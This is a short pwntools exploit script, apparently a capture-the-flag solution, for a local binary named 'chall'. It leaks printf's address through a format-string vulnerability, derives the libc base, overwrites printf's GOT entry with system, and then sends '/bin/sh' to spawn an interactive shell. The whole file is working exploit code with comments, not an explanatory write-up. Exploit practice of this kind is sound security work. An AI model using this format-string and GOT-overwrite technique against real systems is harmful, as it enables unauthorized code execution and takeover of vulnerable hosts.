from pwn import *

context.arch = 'amd64'

p = process('./chall')
elf = ELF('./chall')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

# Step 1: Leak printf@GOT via %s
printf_got = elf.got['printf']
log.info(f"printf@GOT: {hex(printf_got)}")

payload = b'%7$sAAAA' + p64(printf_got)
p.sendline(payload)
resp = p.recvuntil(b'AAAA')
printf_addr = u64(resp[:-4][:6].ljust(8, b'\x00'))
log.info(f"printf addr: {hex(printf_addr)}")

libc.address = printf_addr - libc.symbols['printf']
system_addr = libc.symbols['system']
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system: {hex(system_addr)}")

# Step 2: Overwrite printf@GOT with system
payload = fmtstr_payload(6, {printf_got: system_addr}, write_size='byte')
p.sendline(payload)
p.recv(timeout=2)

# Step 3: Get shell — /bin/sh must NOT have trailing \n
# because printf(buf) -> system(buf), and system() interprets the whole string
p.send(b'/bin/sh\x00')
time.sleep(0.3)
p.sendline(b'id')
p.interactive()
